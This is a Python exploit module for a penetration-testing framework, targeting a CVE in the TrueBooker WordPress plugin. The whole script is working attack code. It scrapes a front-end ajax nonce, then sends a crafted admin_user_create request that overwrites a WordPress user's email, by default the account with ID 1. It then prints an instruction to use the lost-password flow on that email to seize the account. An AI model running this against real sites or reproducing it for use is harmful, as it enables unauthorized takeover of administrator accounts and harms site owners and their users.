#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TrueBooker CVE-2026-18315 — overwrite WP user email via admin_user_create."""

import re
import secrets
from urllib.parse import urlencode

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_NONCE_RE = re.compile(
    r'ajax_object\s*=\s*\{[^}]*?"nonce"\s*:\s*"([a-zA-Z0-9]+)"',
    re.I,
)


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "TrueBooker CVE-2026-18315 account takeover",
        "description": (
            "POST admin_user_create with parsed alldata updates an existing TrueBooker "
            "customer row and calls wp_update_user when truebooker_user_id is set. "
            "Requires front ajax nonce and truebooker_meta_box_noncename (from customer UI)."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-18315"],
        "tags": [
            "auxiliary", "wordpress", "truebooker", "account-takeover", "cve-2026-18315"],
        "agent": {"approval_required": True, "produces": ["credentials", "risk_signals"]},
    }

    path = OptString("/", "WordPress base path", required=False)
    wp_user_id = OptString("1", "WordPress user ID to retarget", required=False)
    truebooker_user_id = OptString(
        "",
        "TrueBooker customer row ID (required for email overwrite path)",
        required=False,
    )
    takeover_email = OptString("", "New email (empty = random @example.test)", required=False)
    meta_box_nonce = OptString("", "truebooker_meta_box_noncename value", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _ajax_nonce(self) -> str:
        for rel in ("/", "/booking/", "/appointment/", "/schedule/"):
            page = self.http_request(method="GET", path=self._join(rel), allow_redirects=True)
            if page:
                m = _NONCE_RE.search(page.text or "")
                if m:
                    return m.group(1)
        return ""

    def run(self):
        tb_uid = (self.truebooker_user_id or "").strip()
        if not tb_uid:
            print_error("truebooker_user_id required for wp_update_user path")
            return False
        meta = (self.meta_box_nonce or "").strip()
        if not meta:
            print_error("meta_box_nonce required (wp_nonce_field truebooker_meta_box_nonce)")
            return False
        sec = self._ajax_nonce()
        if not sec:
            print_error("Front-end ajax nonce not found")
            return False
        email = (self.takeover_email or "").strip() or f"tb{secrets.token_hex(4)}@example.test"
        wp_id = (self.wp_user_id or "1").strip()
        fields = {
            "truebooker_f_user_firstname": "Kitty",
            "truebooker_f_user_lastname": "Sploit",
            "truebooker_f_user_email": email,
            "truebooker_f_user_conutry": "US",
            "truebooker_f_user_state": "CA",
            "truebooker_f_user_phone": "5551234567",
            "truebooker_f_user_city": "Testville",
            "truebooker_f_user_pincode": "90210",
            "truebooker_f_user_address1": "1 PoC Lane",
            "truebooker_f_user_name": "admin",
            "truebooker_f_password": "",
            "truebooker_user_id": tb_uid,
            "truebooker_wp_user_id": wp_id,
            "truebooker_meta_box_noncename": meta,
        }
        alldata = urlencode(fields)
        response = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"action": "admin_user_create", "security": sec, "alldata": alldata},
            allow_redirects=False,
        )
        text = response.text or "" if response else ""
        if "User update successfull" in text or "User update successful" in text:
            print_success(f"Email updated to {email} for WP user {wp_id}")
            print_status("Use WordPress lost-password on that email to obtain a login link")
            return True
        if '"success"' in text:
            print_success("Update reported success")
            print_status(text[:500])
            return True
        print_error("Account update failed")
        print_status(text[:800])
        return False
